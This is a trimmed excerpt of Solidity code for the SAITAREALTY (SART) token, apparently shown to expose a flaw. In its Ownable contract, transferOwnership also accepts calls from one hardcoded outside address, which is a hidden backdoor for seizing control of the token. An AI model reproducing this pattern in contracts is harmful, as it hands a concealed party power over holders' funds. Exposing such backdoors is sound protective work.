...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xAde88ffC0D7C61e1240662726c5A6f9B718e0e31));
...
contract SAITAREALTY is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "SART";
  string private _name = "SAITAREALTY";
